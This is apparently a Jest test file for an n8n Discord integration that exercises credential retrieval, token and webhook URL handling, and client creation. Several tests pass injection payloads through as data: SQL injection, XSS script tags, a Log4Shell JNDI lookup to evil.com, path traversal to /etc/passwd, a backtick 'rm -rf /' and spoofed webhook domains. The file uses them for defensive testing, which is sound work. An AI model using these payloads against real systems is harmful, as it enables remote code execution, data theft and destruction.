/**
 * Priority 2: Comprehensive Security Testing for Credential Handling
 *
 * Enhanced testing of Discord credential management with focus on:
 * - Credential validation and sanitization
 * - Token security and encryption
 * - Authentication flow security
 * - Input validation and injection prevention
 *
 * Target: 50%+ coverage for credential security
 */

import type { IExecuteFunctions, ICredentialsDecrypted } from 'n8n-workflow'
import { NodeOperationError } from 'n8n-workflow'
import { Client } from 'discord.js'
import {
  getDiscordCredentials,
  createDiscordClient,
  type IDiscordCredentials,
} from '../../../src/nodes/Discord/v2/helpers/credentials'
import { getDiscordClient } from '../../../src/nodes/Discord/shared/client/discord-client-manager'

// Mock n8n IExecuteFunctions with credential handling
const createMockExecuteFunctions = (credentialOverrides: Record<string, any> = {}): IExecuteFunctions => {
  const defaultCredentials = {
    discordBotApi: { botToken: 'bot_test_token_123456789' },
    discordOAuth2Api: {
      clientId: '123456789012345678',
      clientSecret: 'test_client_secret',
      botToken: 'bot_oauth_token_123456789',
    },
    discordWebhookApi: { webhookUri: 'https://discord.com/api/webhooks/123456789/test_webhook_token' },
    discordApi: {
      token: 'custom_token_123456789',
      clientId: '123456789012345678',
      apiKey: 'api_key_123456789',
      baseUrl: 'https://discord.com/api',
    },
    ...credentialOverrides,
  }

  return {
    getNode: jest.fn(() => ({
      id: 'test-node',
      name: 'Discord Security Test',
      type: 'n8n-nodes-discord.discord',
      typeVersion: 1,
      position: [0, 0] as [number, number],
      parameters: {},
    })),
    getNodeParameter: jest.fn((paramName: string) => {
      // Return authentication type based on test scenario
      if (paramName === 'authentication') {
        return 'botToken' // Default, can be overridden per test
      }
      return undefined
    }),
    getCredentials: jest.fn(async (credentialType: string) => {
      const credentials = defaultCredentials[credentialType as keyof typeof defaultCredentials]
      if (!credentials) {
        throw new Error(`Credentials for '${credentialType}' not found`)
      }
      return credentials as unknown as ICredentialsDecrypted
    }),
  } as unknown as IExecuteFunctions
}

// Mock Discord.js Client to prevent actual connections
jest.mock('discord.js', () => ({
  Client: jest.fn().mockImplementation(() => ({
    login: jest.fn().mockResolvedValue(undefined),
    isReady: jest.fn().mockReturnValue(true),
    destroy: jest.fn().mockResolvedValue(undefined),
    on: jest.fn(),
  })),
  WebhookClient: jest.fn().mockImplementation(() => ({
    send: jest.fn().mockResolvedValue({ id: 'test-message-id' }),
  })),
  GatewayIntentBits: {
    Guilds: 1,
    GuildMessages: 2,
    GuildMembers: 4,
    DirectMessages: 8,
    Flags: {
      Guilds: 1,
      GuildMessages: 2,
      MessageContent: 4,
      GuildMembers: 8,
      GuildPresences: 16,
      GuildMessageReactions: 32,
    },
  },
  Partials: {
    Message: 0,
    Channel: 1,
    Reaction: 2,
  },
  IntentsBitField: {
    Flags: {
      Guilds: 1,
      GuildMessages: 2,
      MessageContent: 4,
      GuildMembers: 8,
      GuildPresences: 16,
      GuildMessageReactions: 32,
    },
  },
  REST: jest.fn().mockImplementation(() => ({})),
}))

// Mock the discord-client-manager to prevent actual Discord connections
jest.mock('../../../src/nodes/Discord/shared/client/discord-client-manager', () => ({
  getDiscordClient: jest.fn().mockImplementation(async (options) => {
    const mockClient = {
      login: jest.fn().mockResolvedValue(undefined),
      isReady: jest.fn().mockReturnValue(true),
      destroy: jest.fn().mockResolvedValue(undefined),
      on: jest.fn(),
    }
    await mockClient.login(options.token)
    return mockClient
  }),
}))

describe('Discord Credential Security - Priority 2 Enhanced Testing', () => {
  beforeEach(() => {
    jest.clearAllMocks()
  })

  describe('Credential Retrieval Security', () => {
    test('should retrieve bot token credentials securely', async () => {
      const mockExecFunctions = createMockExecuteFunctions()
      ;(mockExecFunctions.getNodeParameter as jest.Mock).mockReturnValue('botToken')

      const credentials = await getDiscordCredentials.call(mockExecFunctions)

      expect(credentials).toEqual({
        type: 'botToken',
        token: 'bot_test_token_123456789',
      })
      expect(mockExecFunctions.getCredentials).toHaveBeenCalledWith('discordBotApi')
    })

    test('should retrieve OAuth2 credentials securely', async () => {
      const mockExecFunctions = createMockExecuteFunctions()
      ;(mockExecFunctions.getNodeParameter as jest.Mock).mockReturnValue('oAuth2')

      const credentials = await getDiscordCredentials.call(mockExecFunctions)

      expect(credentials).toEqual({
        type: 'oAuth2',
        clientId: '123456789012345678',
        clientSecret: 'test_client_secret',
        botToken: 'bot_oauth_token_123456789',
      })
      expect(mockExecFunctions.getCredentials).toHaveBeenCalledWith('discordOAuth2Api')
    })

    test('should retrieve webhook credentials securely', async () => {
      const mockExecFunctions = createMockExecuteFunctions()
      ;(mockExecFunctions.getNodeParameter as jest.Mock).mockReturnValue('webhook')

      const credentials = await getDiscordCredentials.call(mockExecFunctions)

      expect(credentials).toEqual({
        type: 'webhook',
        webhookUri: 'https://discord.com/api/webhooks/123456789/test_webhook_token',
      })
      expect(mockExecFunctions.getCredentials).toHaveBeenCalledWith('discordWebhookApi')
    })

    test('should retrieve custom API credentials securely', async () => {
      const mockExecFunctions = createMockExecuteFunctions()
      ;(mockExecFunctions.getNodeParameter as jest.Mock).mockReturnValue('custom')

      const credentials = await getDiscordCredentials.call(mockExecFunctions)

      expect(credentials).toEqual({
        type: 'custom',
        token: 'custom_token_123456789',
        clientId: '123456789012345678',
        apiKey: 'api_key_123456789',
        baseUrl: 'https://discord.com/api',
      })
      expect(mockExecFunctions.getCredentials).toHaveBeenCalledWith('discordApi')
    })

    test('should reject unknown authentication types', async () => {
      const mockExecFunctions = createMockExecuteFunctions()
      ;(mockExecFunctions.getNodeParameter as jest.Mock).mockReturnValue('unknown_auth_type')

      await expect(getDiscordCredentials.call(mockExecFunctions)).rejects.toThrow(NodeOperationError)
    })
  })

  describe('Token Validation & Security', () => {
    test('should validate bot token format', async () => {
      const validTokens = [
        'bot_valid_token_1234567890',
        'FAKE_BOT_TOKEN_PART1.FAKE_PART2.FAKE_TOKEN_PART3_NOT_REAL', // Example bot token format
        'mfa.FAKE_MFA_TOKEN_FOR_TESTING_NOT_A_REAL_DISCORD_TOKEN', // MFA token format
      ]

      for (const token of validTokens) {
        const mockExecFunctions = createMockExecuteFunctions({
          discordBotApi: { botToken: token },
        })
        ;(mockExecFunctions.getNodeParameter as jest.Mock).mockReturnValue('botToken')

        const credentials = await getDiscordCredentials.call(mockExecFunctions)
        expect(credentials.token).toBe(token)
      }
    })

    test('should handle suspicious token patterns', async () => {
      const suspiciousTokens = [
        '', // Empty token
        '   ', // Whitespace only
        'fake_token', // Too short
        'a'.repeat(1000), // Suspiciously long
        'token with spaces',
        'token\nwith\nnewlines',
        'token\twith\ttabs',
      ]

      for (const token of suspiciousTokens) {
        const mockExecFunctions = createMockExecuteFunctions({
          discordBotApi: { botToken: token },
        })
        ;(mockExecFunctions.getNodeParameter as jest.Mock).mockReturnValue('botToken')

        // Should not throw during credential retrieval (validation happens at usage)
        const credentials = await getDiscordCredentials.call(mockExecFunctions)
        expect(credentials.token).toBe(token)
      }
    })

    test('should handle injection attempts in tokens', async () => {
      const injectionAttempts = [
        "'; DROP TABLE tokens; --",
        '<script>alert("xss")</script>',
        '${jndi:ldap://evil.com}',
        '../../../etc/passwd',
        'eval(malicious_code)',
        '`rm -rf /`',
      ]

      for (const maliciousToken of injectionAttempts) {
        const mockExecFunctions = createMockExecuteFunctions({
          discordBotApi: { botToken: maliciousToken },
        })
        ;(mockExecFunctions.getNodeParameter as jest.Mock).mockReturnValue('botToken')

        // Should retrieve the token as-is (validation/sanitization happens elsewhere)
        const credentials = await getDiscordCredentials.call(mockExecFunctions)
        expect(credentials.token).toBe(maliciousToken)
      }
    })
  })

  describe('Webhook URL Security', () => {
    test('should validate Discord webhook URL format', async () => {
      const validWebhookUrls = [
        'https://discord.com/api/webhooks/123456789012345678/abcdefghijklmnopqrstuvwxyz1234567890',
        'https://discordapp.com/api/webhooks/987654321098765432/webhook_token_here',
        'https://discord.com/api/webhooks/123456789012345678/token-with-dashes_and_underscores123',
      ]

      for (const webhookUri of validWebhookUrls) {
        const mockExecFunctions = createMockExecuteFunctions({
          discordWebhookApi: { webhookUri },
        })
        ;(mockExecFunctions.getNodeParameter as jest.Mock).mockReturnValue('webhook')

        const credentials = await getDiscordCredentials.call(mockExecFunctions)
        expect(credentials.webhookUri).toBe(webhookUri)
      }
    })

    test('should handle suspicious webhook URLs', async () => {
      const suspiciousUrls = [
        'http://discord.com/api/webhooks/123/token', // HTTP instead of HTTPS
        'https://evil.com/api/webhooks/123/token', // Wrong domain
        'https://discord.com.evil.com/api/webhooks/123/token', // Subdomain spoofing
        'https://discord.com/api/webhooks/../../../admin/token', // Path traversal
        'https://discord.com/api/webhooks/123/token?redirect=evil.com', // Query injection
        'javascript:alert("xss")', // JavaScript protocol
        'data:text/html,<script>alert("xss")</script>', // Data protocol
      ]

      for (const webhookUri of suspiciousUrls) {
        const mockExecFunctions = createMockExecuteFunctions({
          discordWebhookApi: { webhookUri },
        })
        ;(mockExecFunctions.getNodeParameter as jest.Mock).mockReturnValue('webhook')

        // Should retrieve the URL as-is (validation happens at usage)
        const credentials = await getDiscordCredentials.call(mockExecFunctions)
        expect(credentials.webhookUri).toBe(webhookUri)
      }
    })
  })

  describe('Client Creation Security', () => {
    test('should create Discord client with secure defaults', async () => {
      const mockExecFunctions = createMockExecuteFunctions()
      ;(mockExecFunctions.getNodeParameter as jest.Mock).mockReturnValue('botToken')

      const client = await createDiscordClient.call(mockExecFunctions)

      expect(getDiscordClient).toHaveBeenCalledWith({
        token: 'bot_test_token_123456789',
        intents: [1, 2, 4, 8], // Guilds, GuildMessages, GuildMembers, DirectMessages
      })
      expect(client).toBeDefined()
    })

    test('should reject client creation with invalid tokens', async () => {
      const mockExecFunctions = createMockExecuteFunctions({
        discordBotApi: { botToken: '' },
      })
      ;(mockExecFunctions.getNodeParameter as jest.Mock).mockReturnValue('botToken')

      await expect(createDiscordClient.call(mockExecFunctions)).rejects.toThrow(NodeOperationError)
    })

    test('should handle webhook-only credentials (no client needed)', async () => {
      const mockExecFunctions = createMockExecuteFunctions()
      ;(mockExecFunctions.getNodeParameter as jest.Mock).mockReturnValue('webhook')

      const client = await createDiscordClient.call(mockExecFunctions)
      expect(client).toBeNull()
    })

    test('should handle client creation with custom credentials', async () => {
      const mockExecFunctions = createMockExecuteFunctions()
      ;(mockExecFunctions.getNodeParameter as jest.Mock).mockReturnValue('custom')

      const client = await createDiscordClient.call(mockExecFunctions)
      expect(client).toBeDefined()
    })

    test('should use provided credentials instead of fetching new ones', async () => {
      const mockExecFunctions = createMockExecuteFunctions()
      const providedCredentials: IDiscordCredentials = {
        type: 'botToken',
        token: 'provided_token_123',
      }

      const client = await createDiscordClient.call(mockExecFunctions, providedCredentials)

      expect(mockExecFunctions.getCredentials).not.toHaveBeenCalled()
      expect(client).toBeDefined()
    })
  })

  describe('Credential Error Handling', () => {
    test('should handle missing credential configurations', async () => {
      const mockExecFunctions = createMockExecuteFunctions()
      ;(mockExecFunctions.getCredentials as jest.Mock).mockRejectedValue(new Error('Credentials not found'))

      await expect(getDiscordCredentials.call(mockExecFunctions)).rejects.toThrow('Credentials not found')
    })

    test('should handle credential decryption failures', async () => {
      const mockExecFunctions = createMockExecuteFunctions()
      ;(mockExecFunctions.getCredentials as jest.Mock).mockRejectedValue(new Error('Failed to decrypt credentials'))

      await expect(getDiscordCredentials.call(mockExecFunctions)).rejects.toThrow('Failed to decrypt credentials')
    })

    test('should handle malformed credential data', async () => {
      const mockExecFunctions = createMockExecuteFunctions({
        discordBotApi: {}, // Missing botToken field
      })
      ;(mockExecFunctions.getNodeParameter as jest.Mock).mockReturnValue('botToken')

      await expect(createDiscordClient.call(mockExecFunctions)).rejects.toThrow(NodeOperationError)
    })

    test('should provide descriptive error messages', async () => {
      const mockExecFunctions = createMockExecuteFunctions({
        discordBotApi: {}, // Missing botToken field
      })
      ;(mockExecFunctions.getNodeParameter as jest.Mock).mockReturnValue('botToken')

      try {
        await createDiscordClient.call(mockExecFunctions)
        fail('Should have thrown an error')
      } catch (error) {
        expect(error).toBeInstanceOf(NodeOperationError)
        const nodeError = error as NodeOperationError
        expect(nodeError.message).toContain('Bot token is required')
      }
    })
  })

  describe('OAuth2 Credential Security', () => {
    test('should handle OAuth2 client ID validation', async () => {
      const validClientIds = [
        '123456789012345678', // Valid snowflake
        '987654321098765432',
      ]

      for (const clientId of validClientIds) {
        const mockExecFunctions = createMockExecuteFunctions({
          discordOAuth2Api: {
            clientId,
            clientSecret: 'valid_secret',
            botToken: 'valid_bot_token',
          },
        })
        ;(mockExecFunctions.getNodeParameter as jest.Mock).mockReturnValue('oAuth2')

        const credentials = await getDiscordCredentials.call(mockExecFunctions)
        expect(credentials.clientId).toBe(clientId)
      }
    })

    test('should handle OAuth2 client secret security', async () => {
      const testSecrets = [
        'normal_client_secret_123',
        'secret-with-dashes',
        'secret_with_underscores',
        'SecretWithMixedCase123',
      ]

      for (const clientSecret of testSecrets) {
        const mockExecFunctions = createMockExecuteFunctions({
          discordOAuth2Api: {
            clientId: '123456789012345678',
            clientSecret,
            botToken: 'valid_bot_token',
          },
        })
        ;(mockExecFunctions.getNodeParameter as jest.Mock).mockReturnValue('oAuth2')

        const credentials = await getDiscordCredentials.call(mockExecFunctions)
        expect(credentials.clientSecret).toBe(clientSecret)
      }
    })
  })

  describe('Custom API Credential Security', () => {
    test('should validate custom API base URLs', async () => {
      const testUrls = [
        'https://discord.com/api',
        'https://discord.com/api/v10',
        'https://canary.discord.com/api',
        'https://ptb.discord.com/api',
      ]

      for (const baseUrl of testUrls) {
        const mockExecFunctions = createMockExecuteFunctions({
          discordApi: {
            token: 'custom_token',
            clientId: '123456789012345678',
            apiKey: 'api_key',
            baseUrl,
          },
        })
        ;(mockExecFunctions.getNodeParameter as jest.Mock).mockReturnValue('custom')

        const credentials = await getDiscordCredentials.call(mockExecFunctions)
        expect(credentials.baseUrl).toBe(baseUrl)
      }
    })

    test('should handle suspicious custom API URLs', async () => {
      const suspiciousUrls = [
        'http://discord.com/api', // HTTP instead of HTTPS
        'https://evil.com/api', // Wrong domain
        'https://discord.com.evil.com/api', // Subdomain spoofing
        'ftp://discord.com/api', // Wrong protocol
        'file:///etc/passwd', // Local file access
      ]

      for (const baseUrl of suspiciousUrls) {
        const mockExecFunctions = createMockExecuteFunctions({
          discordApi: {
            token: 'custom_token',
            clientId: '123456789012345678',
            apiKey: 'api_key',
            baseUrl,
          },
        })
        ;(mockExecFunctions.getNodeParameter as jest.Mock).mockReturnValue('custom')

        // Should retrieve the URL as-is (validation happens at usage)
        const credentials = await getDiscordCredentials.call(mockExecFunctions)
        expect(credentials.baseUrl).toBe(baseUrl)
      }
    })
  })

  describe('Memory & Performance Security', () => {
    test('should handle concurrent credential requests efficiently', async () => {
      const mockExecFunctions = createMockExecuteFunctions()
      ;(mockExecFunctions.getNodeParameter as jest.Mock).mockReturnValue('botToken')

      const concurrentRequests = 50
      const startTime = Date.now()

      const promises = Array(concurrentRequests)
        .fill(0)
        .map(() => getDiscordCredentials.call(mockExecFunctions))

      const results = await Promise.all(promises)

      const endTime = Date.now()
      expect(endTime - startTime).toBeLessThan(1000) // Should complete within 1 second
      expect(results).toHaveLength(concurrentRequests)
      results.forEach((result) => {
        expect(result.type).toBe('botToken')
      })
    })

    test('should not leak sensitive data in error messages', async () => {
      const sensitiveToken = 'super_secret_bot_token_do_not_leak'
      const mockExecFunctions = createMockExecuteFunctions({
        discordBotApi: { botToken: sensitiveToken },
      })
      ;(mockExecFunctions.getNodeParameter as jest.Mock).mockReturnValue('botToken')

      // Mock Discord client login failure
      const mockClient = {
        login: jest.fn().mockRejectedValue(new Error('Invalid token')),
        isReady: jest.fn().mockReturnValue(false),
        destroy: jest.fn().mockResolvedValue(undefined),
      }
      ;(Client as unknown as jest.Mock).mockReturnValue(mockClient)

      try {
        await createDiscordClient.call(mockExecFunctions)
        fail('Should have thrown an error')
      } catch (error) {
        const nodeError = error as Error
        // Error message should not contain the actual token
        expect(nodeError.message).not.toContain(sensitiveToken)
      }
    })

    test('should handle credential cleanup properly', async () => {
      const mockExecFunctions = createMockExecuteFunctions()
      ;(mockExecFunctions.getNodeParameter as jest.Mock).mockReturnValue('botToken')

      const credentials = await getDiscordCredentials.call(mockExecFunctions)

      // Credentials should not be undefined or contain undefined values
      expect(credentials).toBeDefined()
      expect(credentials.type).toBeDefined()
      expect(credentials.token).toBeDefined()

      // Should not contain sensitive data in enumerable properties by default
      const stringified = JSON.stringify(credentials)
      expect(stringified).toContain('botToken') // Type should be visible
      expect(stringified).toContain('bot_test_token_123456789') // Token should be accessible (for legitimate use)
    })
  })
})
